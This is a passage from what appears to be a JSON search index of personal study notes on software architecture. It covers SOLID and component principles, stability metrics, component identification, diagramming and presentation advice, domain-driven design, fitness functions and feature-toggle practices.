cases and operation of the system Maintenance of the system Development of the system Deployment of the system Art of drawing the right boundaries/lines Minimize the human resources required to build and maintain the system. Key notes # Database is a detail -\u0026gt; Is a plugin Web is a detail -\u0026gt; Is a plugin Framework is a detail -\u0026gt; Is a plugin SOLID # Starting from the SOLID principles, we can deduct rules, slightly redefined to apply on module level instead of lower level code. Understand that the clean architecture is largely bases on the SOLID principles and their module level equivalents that grew out of them.\nSRP: Single Responsible Principle # This principle is often misunderstood, originally defined as:\nA module should have one, and only one, reason to change.\nBut more appropiate would be:\nA module should be responsible to one, and only one actor.\nThis makes more sense as software changes to a specific actor (a group of users that act), these actors are the reason to change.\nA module in this definition can be a source file, but depending on the language this can be a loose definition, so let\u0026rsquo;s call it rather a cohesive set of functions and data structures.\nSeparate the code that different actors depend on.\nExample # You have a Employee class with te functions calculatePay(), reportHours() and save(). This is a violation, why? The calculatePay() function would be used by the accountant department or the CFO. This is one actor. The reportHours() are relevant for HR department or the COO, this is another actor than the previous. So this class now serves different types of actors.\nImagine that because of overtime, the CFO wants to change the algorithm on how to calculate the pay, but for the COO, they just want the same type of hours being reported. Here you might make changes that affect another actor\u0026rsquo;s flow, who doesn\u0026rsquo;t want that change. The code should be able to evolve orthogonal for the different actor types.\nSeparate the code that different actors depend on.\nSolution? Move the functions in separate classes and isolate the Employee data. So you end up with a PayCalculator, HourReporter and EmployeeSaver class alongside the Employee class.\nWith a simple facade you can still bring all these functions in a simple class that provides all the functionality, like a EmployeeFacade.\nOCP: Open Closed Principle # A software artifact should be open for extension, but closed for modification.\nArchitects separate functionality based on how, why and when something changes, then organize that separated functionality in a hierarchy of components. Higher level components in that hierarchy are protected from the changes made to lower-level components.\nThis principle is mainly to protect changes in one component to another component. This is done by arranging components in a dependency hierarchy that protects higher-level components form changes in lower level components.\nLSP: Liskov Substitution Principle # What is wanted here is something like the following substitution property: if for each object o1 of type S there is an object 02 of type T such that for all programs P defined in terms of T, the behavior of P is unchanged when o1 is substituted for o2 then S is a subtype of T. This rule is a good guide in asserting if the inheritance makes sense between two types. This principle easily translates to an architectural level.\nImagine calling 4 different API\u0026rsquo;s that should follow a spec, but one doesn\u0026rsquo;t. Now you have to create special code for the exceptions, clearly, there is not simple substitution possible.\nExample: Good # We have an interface License and we have then two classes Personal License and Business License. They both can implement the calculateFee() function without weird unexpected side effects.\nExample: Bad # We have a class Rectangle with setHeight and setWidth, a Square should not inherit/subclass the rectangle. Because there you should have a function setSide(). Now the user needs to be aware that:\nRectange r = ... r.setWidth(5); r.setHeight(2); assert(r.area() == 10); // This will fail, and come as a surprise the Square is not a suitable subtype of Rectangle in this solution.\nISP: Interface Segregation Principle # The ISP is a bit of a language depending principle, dynamic typed languages might not suffer as much of the violations of this principle.\nThe idea is not to pollute an interface with too many responsibilities which are not cohesive or relevant to each other. You might force certain code and modules to be too much aware or create unnecessary dependencies because of a polluted interact. You might have to depend on more than you need, meaning, unnecessary dependencies.\nThis might cause unnecessary recompilations.\nDIP: Dependency Inversion Principle # The most flexible systems are those in which source code dependencies refer only to abstractions, not to concretions.\nIn a statically typed language this means use, import and include statements should refer only to source modules containing interacts, abstract classes or other kind of abstract declaration.\nIn dynamic languages, same applies, only it is harder to define what is \u0026ldquo;abstract\u0026rdquo;.\nNote that String is a concrete dependency, but has a very low volatile characteristic, so this should be a safe dependency, unlike other more volatile elements. Usually these are systems we are actively developing or external services.\nAs it is often the implementation that changes a lot and not the interface, the interfaces are less volatile than the concrete implementations.\nDon\u0026rsquo;t refer to volatile concrete classes. Don\u0026rsquo;t derive from volatile concrete classes. Don\u0026rsquo;t override concrete functions. Never mention the name of anything concrete and volatile. Remember: Concrete implementations require more dependencies.\nA good solution is Abstract Factories, factories that create instances of a service for example.\nUsually DIP violations can not be entirely removed, but should be limited.\nComponent Principles # Component Cohesion # Principles for which classes belong in which components.\nREP: The Reuse/Release Equivalence Principle # The granule of reuse os the granule of release.\nUse a release process with release numbers, else reuse is impossible. Classes and modules that are grouped together should be releasable together. Consider googling more on this principle.\nCCP: The Common Closure Principle # Gather into components those classes that change for the same reasons and at the same time. Separate into different components those classes that change at different times and for different reasons.\nGather together those things that change at the same times and for the same reasons. Separate those things that change at different times or for different reasons.\nThis is SRP (Single Responsibility Principe) for components.\nMost applications, maintainability is more important than reusability. Remember, don\u0026rsquo;t overdo DRY. Place code together that can\u0026rsquo;t move orthogonally from each other and always moves in parallel. Also associates with the OCP (Open Closed Principle). CRP: The Common Reuse Principle # Don\u0026rsquo;t force users of a component to depend on things they don\u0026rsquo;t need.\nDon\u0026rsquo;t depend on things you don\u0026rsquo;t need.\nWhen one component uses another, a dependency is created between the components. Perhaps the using components uses only one class within the used component, but that still doesn\u0026rsquo;t weaken the dependency. The using components still depends on the used component.\nBecause of the dependency, every time the used component is changed, the using component will likely need corresponding changes. Even if no changes are necessary to the using component, you still might need to recompile, revalidate an redeploy.\nThis principle tells us more about which classes shouldn\u0026rsquo;t be together than which classes should be together.\nThis is ISP (Interface Segregation Principle) for components.\nFinding the balance # So we have the following principles for component cohesion:\nREP: The Reuse/Release Equivalence Principle (Tends to make components larger) CCP: The Common Closure Principle (Tends to make components larger) CRP: The Common Reuse Principle (Tends to make component smaller) And they tend to find with each other. A good architect finds a position in that tension triangle that meets the current concerns of the development team, but is also aware that those concerns will change over time. For example, early in the development of a project, the CCP is much more important than the REP, because developability is more important than reuse.\nGenerally projects tend to start on the right hand side of the triangle. As it matures, and other projects begin to draw from it, it will slide over to the left.\nComponent Coupling # Deals with relationships between components. Same as cohesion, there will be tension between developability and logical design.\nADP: Acyclic Dependencies Principle # Allow no cycles in the component dependency graph.\nSolution is often to partition the development environment in releasable components. Use semver to release these components, so other developers can that depend on them can choose when to upgrade.\nThere can be no cycles.\nSolutions\nApply the DIP (Dependency Inversion Principle) Create a new component that depends on the two components that have a cyclic dependency. Top-Down Design # The component structure cannot be designed from the top down.\nStable Dependencies Principle # Depend in the direction of stability.\nSome components are expected to be volatile, while others aren\u0026rsquo;t. This is important to take in consideration to see which components will depend on other components.\nStability has nothing directly to do with frequency of change. Rather to the amount of work required to make a change.\nHow does that happen, by having many other components depend on it. If you have a component x that has 3 other components depend on it, it has three good reasons not to change. As x is responsible for those 3 components. But if component x depends on nothing, it\u0026rsquo;s considered a independent component.\nWhen we have a component y that depends on 3 separate components. So y is dependent, but also irresponsible, as it\u0026rsquo;s not responsible for any other components that depend on it. This is also considered a unstable component.\nThe metric I of a component should be larger than the I metrics of the components it depends on. That is, I metrics should decrease in the direction of dependency.\nOften, we can fix violations on the rule with the DIP. In Static languages you might end up with abstract components, where there are only abstractions.\nStability Metrics\nHow can we quantify the stability of a component?\nOne way way is to count the # of dependencies that enter and leave the component. This will give us a positional stability.\nFan-in: Incoming dependencies. Fan-out: Outgoing dependencies. I: Instability = Fan-Out / Fan-In. I = 1 : Max instability I = 0 : Max stability Note that \u0026ldquo;dependencies\u0026rdquo; are counted by the amount of classes are depended on. If a component x depends on 2 classes in component y, this means the fan-in is 2 between the two components, not 1.\nSAP: Stable Abstractions Principle # A component should be as abstract as it is stable.\nSome software should not change very often. This represents high-level architecture and policy decisions. We don\u0026rsquo;t want these business and architectural decisions to be volatile (notice Entities in the center). So these components should be I = 0, meaning stable. Unstable components I = 1 should contain only software that is volatile (in outer layers).\nThis is OCP (Open Closed Principle) for components.\nOn the one hand, a stable component should also be abstract so that its stability does not prevent it from being extended. On the other hand, an unstable component should be concrete since its instability allows the code within to be easily changed.\nIf a component is to be stable, it should consist of interfaces and abstract classes so that it can be extended.\nThe (SAP) Stable Abstraction Principle and the (SDP) Stable Dependency Principe combined amount to the (DIP) Dependency Inversion Principe for components. Stable Dependency Principle (SDP) says that dependencies should run in the direction of stability, and the Stable Abstractions Principe (SAP) says that stability implies abstraction. Thus dependencies run in the direction of abstraction.\nThe combination of SAP and SDP allows a component to be partially abstract and partially stable.\nMeasuring Abstraction\nA metric quantifies the abstractness of a component.\nNc: The number or classes in the component (concrete code). Na: The number of abstract classes or Interfaces in the component. A: Abstractness = Na / Nc A = 1 : Max abstractness. A = 0 : Max concreteness. Relation Abstraction (A) and Instability (I)\nThe zones of exclusion:\nThe Zone of Pain : Highly stable and concrete. Cannot be extend because there is not abstraction, and hard to change because it is stable. So read, a lot of concrete code that is depended on. The Zone of Uselessness : Means it\u0026rsquo;s max abstract, but no one depends on it, making it useless. Some entities in fact fail in the Zone of Pain. Like database schema. They are volatile, extremely concrete and highly depended on. This is why the interface between OO and databases is difficult to manage and why schema updates are generally painful. Another example is String, this is very stable, but no abstractions. But as it\u0026rsquo;s so commonly used, we can consider it nonvolatile. Nonvolatile components in the zone of pain are harmless. One could consider the level of volatility to be a Z axis.\nIdeally we try to have our components on the Main Sequence which have ideal balance. Most desirable tho is to be on a endpoint of the main sequence.\nDistance from the Main Sequence\nThis helps us measure how far a component is from the ideal. We do this to calculate the distance D from the main sequence.\nD = |A + I - 1|\nD = 0 on the Main Sequence D = 1 furthest away from the Main Sequence. Any D \u0026gt; 0.1 is worth finding out why it\u0026rsquo;s so far from the main sequence. Conclusion # The metrics A, I and D are good guidelines to measure how well we comply with the Component coupling principles, but a metric is not a god. This is an arbitrary stand, they are imperfect, but they can be useful.\n"},{"id":92,"href":"/software-architecture/topics/components/","title":"Components","section":"Software Architecture","content":" Components # Components are the physical manifestation of a module and group artifacts together. Nothing requires you to use components, it just happens to be that its useful to have a higher level of modularity. Components form the fundamental modular building blocks in architecture.\nTypically the architect defines, refines, manages, and governs components. Architecture is independent of the development process. Generally tne component is the lowest level of the software system an architect directly interacts with. Architects must identify components as one of the first task of a new project. But before an architect can identify components, they must know how to partition architecture.\nComponent Scope # The scope of a component can manifest/decided in various ways:\nThe simplest component wraps code at higher level of modularity than classes. This is often called a library, libraries are usually compile-time dependencies (DLL notable exception). Components also appear as subsystems or layers in architecture as deployable units of work. Another type of component, a service, tends to run in its own address spaces and communicates via low-level networking protocols like TCP/IP or higher-level formats like REST or message queues, forming stand-alone, deployable units in architectures like microservices. Scope directly impacts the granularity of the component which is one of the bigger challenges that architects face.\nDiagram: Varieties of components Diagram: Microservice might not require components if is small enough Technical vs Domain Partitioning # Systems are decomposed/partitioned in one or more components by doing top-level partitioning. There are 2 approaches on how to approach this partitioning of components. *The top-level partitioning is of particular interest to architects because it defines the fundamental architectural style and way of partitioning code. As always, each partitioning approach has trade-offs. Choosing technical or domain partitioning approach is one of the first decisions an architect must make.\nTechnical Partitioning: Organizing architecture based on technical capabilities like the layered architecture. The organizing principles of this architecture is separation fo technical concerns. This separation enables developers to find certain categories of the code base quickly, as its organized by capabilities. However, most realistic software systems require workflows that cut across technical capabilities. Emphasizes reuse, redundancy should be less tolerated. Might result in stronger coupling. Domain Partitioning: Organizing architecture by (workflow and/or business) domain rather than technical capabilities. Domains better reflects the kind of changes that most often occur on projects. Reuse is less desirable, redundancy should be more tolerated. See DDD as a methodology on defining domains. Should result in less coupling. Diagrams\nDiagram: 2 types of top-level architecture: layered and modular Diagram: Technical vs Domain partitioning Comparison # Domain Partitioning Technical Partitioning Advantages - Models closely toward how the business functions rather than the implementation detail- Easier to utilize the Inverse Conway Maneuver to build cross-functional teams around domains- Align more closely to the modular monolith and microservices architecture styles.- Message flows matches the problem domain- Easy to migrate data and components to distributed architecture. - Clearly separates customization code.- Aligns more closely to the layered architecture pattern. Disadvantage - Redundancy of some else, reusable logic. - Higher degree of global coupling.- Developers may have to duplicate domain concepts in different layers- Typically higher coupling at the data level. Meaning application and data architects must collaborate closely Identifying Components # Have a look at the Component Identification Flow/Cycle Diagram to see how the individual steps related. Component identification works best as an iterative process, producing candidates and refinements through feedback.\nIdentify Initial Components: Must somehow determine that top-level components to begin with, based on the top-level partitioning approach (Technical vs Domain). The likelihood of achieve a good design from this initial set components is near to 0. Assign Requirements To Components: Align requirements (or user stories) to those components to see how well they fit. This may entail creating new components, consolidating existing ones, or breaking components apart. Analyze Roles and Responsibilities: Look at the roles and responsibilities elucidated during the requirements to make sure that the granularity matches, finding the correct granularity is one of the greater challenges. Therefore, think about both the roles and behaviors the application must support that allows the architect to align the component and domain granularity. Analyze Architecture Characteristics: Look at the architecture characteristics discovered earlier in order to think about how they might impact component division and granularity. For example, while two parts of a system might deal with user input, the part that deals with hundreds of concurrent users will need different architecture characteristics than another part that needs to support only a few. Thus, while a purely functional view of component design might yield a single component to handle user interaction, analyzing the architecture characteristics will lead to a subdivision. Restructure Components: Feedback is critical, so continually iterate on their component design with developers. An iterative approach is key. As the architects and developers delve more deeply into building the application, they gain more nuanced understanding of where behavior and roles should lie. Component Granularity # Finding proper granularity is one of the most difficult tasks for an architect.\nToo fine-grained component design leads to too much communication between components to achieve a result. Too coarse-grained component design leads to difficulties in deployability and testability + modularity related negative effects. Component Design # The goal is an initial design that partitions the problems space in coarse chunks that take into account different architecture characteristics. There are different approaches in identifying components.\n[Anti-Pattern] Entity Trap Actor/Actions Approach: Popular way to map requirements to components. Originally in the Rational Unified Process (RUP), architects identify who performs activities with the application and the actions those actors might perform. Works well for monolithic and distributed systems. Works well for technical and domain partitioning. Event Storming Approach: Polar with microservices, the architect assumes the project will use messages and/or events to communicate between various components. Works well for distributed systems with messages/events. Works well for domain partitioning. Workflow Approach: Models the components around workflows, much like event-storming, but without the explicit constraints of building a message-based system. A workflow approach identifies key roles, determines the kind of workflows these roles engage in, and builds components around the identified activities. An alternative to Event Storming, more generic for those wo are not using DDD or messaging. Works well for distributed systems with messages/events. Works well for domain partitioning. None of these techniques is superior to the others; all offer a different set of trade-offs. When using waterfall, the Actor/Action approach works well. When doing DD and distributed styles, event storming might be a good fit.\nChoosing Between Monolithic vs Distributed Architectures # Read Architecture Styles\nResources # Fundamentals of Software Architecture - Chapter 8 "},{"id":93,"href":"/software-architecture/topics/conway-law/","title":"Conway Law","section":"Software Architecture","content":" Conway Law # Todo\u0026hellip;\nRole of conways law in architecture See \u0026ldquo;Build microservices\u0026rdquo; book of sam newmann, which has \u0026ldquo;Evolutionary Architect\u0026rdquo; Systems\u0026hellip; team topologies\u0026hellip; reflection or architectural style\u0026hellip;\nArchitecture and Organization # Todo\u0026hellip;\nReverse Conway # Todo\u0026hellip;\nExtra # Todo\u0026hellip; Notice how Conway Law, Team Topologies, Organization, all are systems, and architecture is about systems, so it only makes sense that we can draw parallels in all of it.\nResources # Team Topologies Building Evolutionary Architectures - Chapter 8, p102 "},{"id":94,"href":"/software-architecture/topics/design-principles/","title":"Design Principles","section":"Software Architecture","content":" Design Principles # Describes the guidelines for how a system should be constructed. Instead of a hard rule, like the architecture decisions, the guidelines are intended to \u0026ldquo;guide\u0026rdquo;.\nDesign (instead of architecture) is more in the \u0026ldquo;implementation details\u0026rdquo;, in the code base (e.g. design patterns), or the actual used technology. Architecture is the structure where the design lives in. Note that the line can be grey sometimes.\nExample: \u0026ldquo;Wherever possible, leverage async communication for decoupling\u0026rdquo;\nDesign Principles Image\n"},{"id":95,"href":"/software-architecture/topics/diagrams-and-presentations/","title":"Diagrams and Presentations","section":"Software Architecture","content":" Diagramming and Presenting Architecture # Effective communication is critical to an architect\u0026rsquo;s success. Diagramming and presenting are two critical soft skills for the software architect.\nPattern: Representational Consistency # The practice of always showing the relationship between parts or an architecture, either in diagrams or presentations, before changing views. This is important when describing an architecture, where you must often show different views of the architecture.\nDiagram Example with Representational Consistency\nDiagramming # The topology of architecture is always of interest to architects and developers because if captures how the structure fits together.\nAnti-Pattern: Irrational Artifact Attachment # Proportional relationship between a person\u0026rsquo;s irrational attachment to some artifact and how long it took to produce. That means one will be more attached to a four-hour diagram than a two-hour one. Using low-tech tools lets teams throw away what\u0026rsquo;s not right.\nTool Requirements # Many tools exist, the following requirements are well advised to be productive and efficient in creating diagrams.\nLayers: A layer allows the drawer to link a group of items together logically to enable hiding/showing individual layers. Using layers, you can build a comprehensive diagram but hide overwhelming details when they aren\u0026rsquo;t necessary. Stencils/Templates: Ability to build up a library of stencils/templates of common visual components, often composites of other basic shapes. This allows to create visual consistency within your organization. Magnets: Represents the places on those shapes where lines snap to connect automatically, providing automatic alignment and other visual niceties. Standards # UML: Unified Modeling Language which has many interesting diagram types byt has fallen into disuse. Class and workflow diagrams are probably still most mainstream. C4: There are 4 views or \u0026ldquo;layers\u0026rdquo; of the system Context: Entire context of the system, including the roles of users and external dependencies. Container: The physical (and often logical) deployment boundaries and containers within the architecture. This view forms a good meeting point for operations and architects. Component: This mostly aligns with an architect\u0026rsquo;s view of the system. Class: Same as the style of class diagrams from UML. One downside is the inability to express every kind of design an architecture might undertake. C4 is best suited for monolithic architectures where the container and component relationships may differ, and it\u0026rsquo;s less suited to distributed architectures. ArchiMate: Open source enterprise architecture modeling language to support the description, analysis, and visualization of architecture within and across business domains. The goal of ArchiMate is to be \u0026ldquo;as small as possible\u0026rdquo;, not to cover every edge case scenario. Guidelines # When modelling, build your own style when creating diagrams and feel free to borrow from representations that are particularly effective.\nConsistency: Consistency is key Titles: All the elements of a diagram should have titles or are well known to the audience. Lines: Should be thick enough to see well. If lines indicate information flow, use arrows to indicate direction. Different arrow heads might suggest other semantics, be consistent. Sync communication is usually a solid line. Async communication is usually a dotted line. Shapes: No shapes exists across software development, be consistent within your organization. Labels: Label each item. Color: We might often favour monochrome, use color when it helps distinguish artifacts from another. Keys: If shapes are ambiguous for any reason, include keys to indicate what each shape indicates. (a legend) Presenting # We will cover here a few interesting points, but the Presentation Patterns book goes very deep here to list various patterns and anti-patterns.\nThe difference between a document and a presentation is time, the presenter controls how quickly unfolds, instead of the the reader (which is the case with a document). Therefore, as a presenter you must learn how to manipulate time.\nManipulating Time # Presentation tools offer 2 ways to manipulate time on slides: transitions and animations. Transitions move from slide to slide, animations allow for movement within a slide. These are used to hide the boundaries between slides. Using subtle combinations of transitions and animations such as dissolve allows presenters to hide individual slide boundaries, stitching together a set of slides to tell a single story. TO indicate the end of a thought, presenters should use a distinctly different transition (like a door or cube) to provide a visual clue tha they are move to a different topic.\nIncremental Builds # A common anti-pattern of presentations is where every slide has essentially the speaker\u0026rsquo;s notes, projected for all to see. Most readers who read ahead of the speaker and then switch to listening, just waiting for the speaker to finish reading off the slide. Also this overloads the slide, which can be overload the attention of the audience.\nThe speaker has 2 information channels: verbal and visual. The solution to this problem is to use incremental builds for slides, building up (hopefully graphical) information as needed rather than all at once.\nYou can use the same image but only show a part of it, and hide the rest of the image with a borderless white box. The presenter can then expose a portion at a time.\nBad Version: Slide shows everything at once - This can really be hard for anyone to process the image. Good Version: Slide shows incrementally unveils part of the image - This allows for a paced progression, unveiling one portion at a time. Building incrementally your story. Infodecks vs Presentations # Infodecks: Slide decks that are not meant to be projected/presented but rather summarize information graphically. There is no need for transitions and animations, the information is also more comprehensive. All information should be on the slides, as they stand on their own. Presentations: Slide deck meant for a presentation, where the presenter has a verbal and visual communication channel. Slides should be less comprehensive, as the verbal channel should guide through the presentation. Slides should be just half of the story. Slides Are Half Of The Story # Presenters make the mistake of adding too much material to slides when they can make important points more powerfully. Remember, presenters have 2 information channels (slides and speaker), use it strategically for adding more punch.\nInvisibility # A simple pattern where the presenter inserts a blank black slide within a presentation to refocus attention solely on the speaker. If someone has 2 information channels (slides and speaker) and turns one of them off (the slides), it automatically will focus attention back on the speaker because they are now the only interesting thing in the room to look at.\nResources # Fundamentals of Software Architecture - Chapter 21 Presentation Patterns: Techniques of crafting better presentations "},{"id":96,"href":"/software-architecture/topics/domain-driven-design/","title":"Domain Driven Design","section":"Software Architecture","content":" Domain Driven Design (DDD) # Domain-Driven-Design (DDD) is a popular and great logic design process to identify and define domains and their boundaries. This is the original book and this is a small martin fowler entry. When reading about DDD, look for the bounded contexts parts which are great for domain modelling, DDD dus more than just that though.\nEvent Storming # The architect tries to determine which events occur in the system based on requirements and identified roles, and build components around those event and message handlers. This works well in distributed architectures like microservices that use events and messages, because it helps architects define the messages used in the eventual system.\n"},{"id":97,"href":"/software-architecture/topics/evolutionary-architecture/","title":"Evolutionary Architecture","section":"Software Architecture","content":" Evolutionary Architecture # Introduction # All architectures evolve, they have to, every system changes over time due to internal factors (technology changes, new use cases) and external factors (the industry changes, new markets, \u0026hellip;). It only makes sense to look at your architecture as something that evolves over time for various reasons.\nEvolutionary architecture defines the concept of a fitness function to measure certain architectural characteristics over time. By collecting this data from fitness functions, one can see how architectural characteristics are affected as the architecture evolves over time. With this data to your disposal, you can observe if changes negatively or positively affected your architecture. This observability of your architecture allows you to react and adjust accordingly the development of your architecture in a way that desired characteristics are conserved.\nFitness functions overlap many existing verification mechanisms, depending on the way they are used (as metrics, monitors, unit test libraries, chaos engineering, and so on.).\nMore on architectural characteristics\nRemember: Change is constant, so might as well accept that and plan for it\nFitness Functions # Fitness Function: Any mechanism that performs an objective integrity assessment of some architecture characteristic or combination of architecture characteristics.\nAny mechanism: Wide variety of tools to implement fitness functions. Objective integrity Assessment: Objective definitions for architecture characteristics. some architecture characteristic or combination of architecture characteristics: There are 2 scopes for fitness functions Atomic: Validates a single architecture characteristic Holistic: Validates a combination of architecture characteristics. Exercises a combination of interlocking architecture characteristics to ensure that the combined effect won\u0026rsquo;t negatively affect the architecture. One implements fitness functions to build protections around unexpected change in architecture characteristics. The separation between fitness functions and unit tests provide a good scoping guideline for architects. Fitness functions validate architecture characteristics, not domain criteria; unit tests are the opposite.\nYou can decided wether a fitness function or unit test is needed by asking the question:\nIs any domain knowledge required to execute this test? If \u0026ldquo;yes\u0026rdquo;, then a unit/function/user acceptance test is appropriate; if \u0026ldquo;no\u0026rdquo;, then a fitness function is needed.\nAutomated vs Manual # Fitness functions are ideally automated, although in some occasions, manual work might be required.\nWhen to run? # Automated fitness functions certainly qualify well be a part of your continuous integration pipeline. Manual fitness functions depend on the use case an scope, but probably at some integration or user acceptance phase. Do what makes most sense to you.\nExamples # Cyclic Dependencies Between Components: Create an automated test (e.g. with jDepend) to detect any cyclic dependencies between components. Respect Layered Architecture: Create an automated test to detect if the set rules for your layered architecture are respected (nowhere are closed layers skipped). Distance from the main sequence: This is characteristic regarding modularity Tools # jDepend ArchUnit NetArchTest SonarQube Architectural Coupling # Todo\u0026hellip;\nEvolutionary Data # Todo\u0026hellip;\nBuilding Evolvable Architectures # Todo\u0026hellip;\nPitfalls and Anti-Patterns # Todo\u0026hellip;\nIn Practice # Todo\u0026hellip;\nTodo\u0026hellip; # \u0026hellip;mention that by doing the right decoupling and layers within a component or overal architecture, it allows to change things over time with a limited blast radius (e.g. swap out the database).\nResources # Building Evolutionary Architectures: Support Constant Change Software Architecture: The Hard Parts "},{"id":98,"href":"/software-architecture/topics/feature-toggles/","title":"Feature Toggles","section":"Software Architecture","content":" Feature Toggles # Note: Also known as Feature Flags.\nThese are not necessarily architecture domain specific, but they allow for a smooth transition in evolutionary architecture. Especially the operational toggles require maybe some architectural consideration if they make sense.\nThe following part is basically a summary of this awesome Martin Fowler Entry by Pete Hodgson.\nWhy Use? # Code Branch Management: By shipping new code to production, hidden under a toggle, you can limit the amount of long-lived branches. Also known as dark deployments. Test In Production: Test features in production with a limited set of users. Allowing for A/B testing or canary releases. Flighting: Incremental roll out of new functionality. Kill Switch: Turn of certain functionality without redeploying, like a circuit breaker. When the load is to high, you can switch off certain features that are resource intensive (e.g. a recommendation service). Categories # It can be tempting to lump all feature toggles into the same bucket, but this is a dangerous path. The design forces at play for different categories of toggles are quite different and managing them all in the same way can lead to pain down the road. It can be tempting to lump all feature toggles into the same bucket, but this is a dangerous path. The design forces at play for different categories of toggles are quite different and managing them all in the same way can lead to pain down the road.\nSee Diagram\nType Description Lifespan Dynamism Release Allow incomplete and un-tested codepaths to be shipped to production as latent code which may never be turned on, allowing for trunk-based development of larger features and user stories. Short - Days, WeeksRelease Toggles are transitionary by nature. They should generally not stick around much longer than a week or two. Typically StaticChanging that toggle by rolling out a new release with a toggle configuration change is usually perfectly acceptable. Experiment Used to perform multivariate or A/B testing. Each user of the system is placed into a cohort and at runtime the Toggle Router will consistently send a given user down one codepath or the other, based upon which cohort they are in. Commonly used to make data-driven optimizations Short - Hours, Days, WeeksAn Experiment Toggle needs to remain in place with the same configuration long enough to generate statistically significant results. Longer is unlikely to be useful, as other changes to the system risk invalidating the results of the experiment. Highly DynamicEach incoming request is likely on behalf of a different user and thus might be routed differently than the last. Operational Control operational aspects of our system\u0026rsquo;s behavior.Example: rolling out a new feature which has unclear performance implications so that system operators can disable or degrade that feature quickly in production if needed. Short to Long - Weeks, Months, YearsOnce confidence is gained in the operational aspects of a new feature the flag should be retired. However it\u0026rsquo;s not uncommon for systems to have a small number of long-lived \u0026ldquo;Kill Switches\u0026rdquo; which allow operators of production environments to gracefully degrade non-vital system functionality when the system is enduring unusually high load.These types of long-lived Ops Toggles could be seen as a manually-managed Circuit Breaker. DynamicThe purpose of these flags is to allow operators to quickly react to production issues they need to be re-configured extremely quickly. Permission Used to change the features or product experience that certain users receive. A Canary Released feature is exposed to a randomly selected cohort of users while a Champagne Brunch feature is exposed to a specific set of users. Long - Months, YearsWhen used as a way to manage a feature which is only exposed to premium users a Permissioning Toggle may be very-long lived compared. Highly DynamicEach incoming request is likely on behalf of a different user and thus might be routed differently than the last. Static vs Dynamic Toggles # Dynamic: Toggles which are making runtime routing decisions necessarily need more sophisticated Toggle Routers, along with more complex configuration for those routers. Static: Can be a simple config file, no need for a sophisticated Toggle Routers Long lived vs Short Lived Toggles # Short Lived: A simple if/else check on a Toggle Router would suffice. Long Lived: We need more maintainable implementation techniques. Implementation Techniques # Feature Flags seem to beget rather messy Toggle Point code, and these Toggle Points also have a tendency to proliferate throughout a codebase.\nDe-coupling decision points from decision logic. Inversion of Decision. Avoiding conditionals. Toggle Configuration # Dynamic Routing vs Dynamic Configuration: When highly dynamic, there is still a distinction between \u0026ldquo;Routing\u0026rdquo; (e.g. for user X, experiment/permission toggle is Y) and \u0026ldquo;Re-Configuring\u0026rdquo; (e.g. Disable feature x because of high server load). The dynamic routing logic itself in itself might have a configuration that is fairly static (e.g. the formula/algorithm that decides in which cohort users land for an experiment toggle). Prefer Static Configuration: Managing toggle configuration via source control and re-deployments is preferable, if the nature of the feature flag allows it. Managing toggle configuration via source control gives us the same benefits that we get by using source control for things like infrastructure as code and the code base itself. Approaches for managing toggle configuration: Hardcoded Toggle Configuration: Comment/Uncomment blocks of code. (requiring to rebuild and redeploy) Parameterized Toggle Configuration: Commandline arguments or environment variables. (not requiring to rebuild, but requires redeploy or process restart) Toggle Configuration File: Use a configuration file, could be part of more general application configuration. (not requiring to rebuild, but requires redeploy) Toggle Configuration in App DB: Centralized database with configuration. (not requiring to rebuild, nor requires redeploy) Distributed Toggle Configuration: For HA, a database with configuration like Zookoper, etcd, or Consul. (not requiring to rebuild, nor requires redeploy) Overriding Configuration: You might have a defeault configuration (any from above) along with overrides based on a specific scope (e.g. Environment Specific, Per-request). Working with feature-flag systems # While feature toggling is absolutely a helpful technique it does also bring additional complexity. There are a few techniques which can help make life easier when working with a feature-flagged system.\nExpose current feature toggle configuration: Making is visible/accessible to know the current toggle configuration (e.g. dashboard). Take advantage of structured Toggle configuration files: Make human readable and understandable descriptions + maybe a contact person. Manage different toggles differently: You might keep release toggles in your version control repo, but the operational toggles on a dynamic configuration. Toggles can transition from category to category over time, which means you might need to refactor how the configuration is done. E.g A feature toggle became a permission toggle. Feature Toggles introduce validation complexity (testing): Each toggle introduces new branches on the code baths. With multiple toggles in play we have a combinatoric explosion of possible toggle states. Happily, the situation isn\u0026rsquo;t as bad as some testers might initially imagine. It is not necessary to test every possible combination. Most feature flags will not interact with each other, and most releases will not involve a change to the configuration of more than one feature flag. TIP: a good convention is to enable existing or legacy behavior when a Feature Flag is Off and new or future behavior when it\u0026rsquo;s On. Where to place your toggle: Toggles at the edge: Ideal for per-request context (Experiment/Permission Toggles) Toggles in the core: Usually technical in nature, and control how some functionality is implemented internally. Localizing these toggling decisions is more sensible. E.g. a Release Toggle which controls whether to use a new piece of caching infrastructure in front of a third-party API. Managing the Carrying cost of Featue Toggles: Savvy teams view their Feature Toggles as inventory which comes with a carrying cost, and work to keep that inventory as low as possible Governance # Governance can be defined as the establishment of policies around the how/what/why/when of your feature flag implementation.\nLimit Feature Flag Lifetimes to Minimize Technical Debt: Based on their category/type, their lifecycle should be short or can be longer, make sure to follow this up. Defining Access Controls for Flags: Make sure that ignorant or unaware developers can flip the wrong switches. In addition, you might introduce some \u0026ldquo;2-step\u0026rdquo; verification, so another developer must approve your change of the feature toggle. This is more applicable in highly regulated industries. Define, Document and Communicate Ownership Model: Crisp ownership over who implements, rolls out, and maintains each flag must be absolutely clear. Some examples: Most Common: The dev team owns implementation and maintenance; product team owns communication and the controls of the rollout. Operational Flags acting as circuit breakers: DevOps or SRE may own the maintenance and communication. Use TAGS if supported: Tags are in the cloud world excellent metadata tools to tag any resources (like a feature toggle) with any arbitrary metadata that can help with the governance. E.g. The Owner, the category, description, maybe any dependencies. Visibility: We want visibility of feature flags, their state, and if possible, their interdependencies, their category, and their lifetime. Ways to do this: Dedicated feature flag dashboard Feature Flag dashboard integrated with your continuous delivery (CD). Auditability: The ability to audit the feature flags, when they existed and what their values were over time, who made these modifications, and who might have approved these modifications. Very useful to troubleshoot issues. Policy As Code: Leverage Policy As Code if available for your Feature Flag platform. Resources # Martin Fowler Entry by Pete Hodgson A feature flag horror story Optimizely: Feature Flag Governance Azure App Configuration: Feature Management Feature Flags \u0026amp; Ephemeral Environments "},{"id":99,"href":"/software-architecture/topics/how-to-do/","title":"How to Do","section":"Software Architecture","content":" How To Do\u0026hellip; (WIP) # This is a list of examples on how certain work can be approached and executed. These are not hard rules, but more like aids to help you get started. As you learn and grow as an architect, you will find your own way of doing things.\nDesigning a greenfield project # Get requirements -\u0026gt; See components the process on how to define them, then characteristics, the 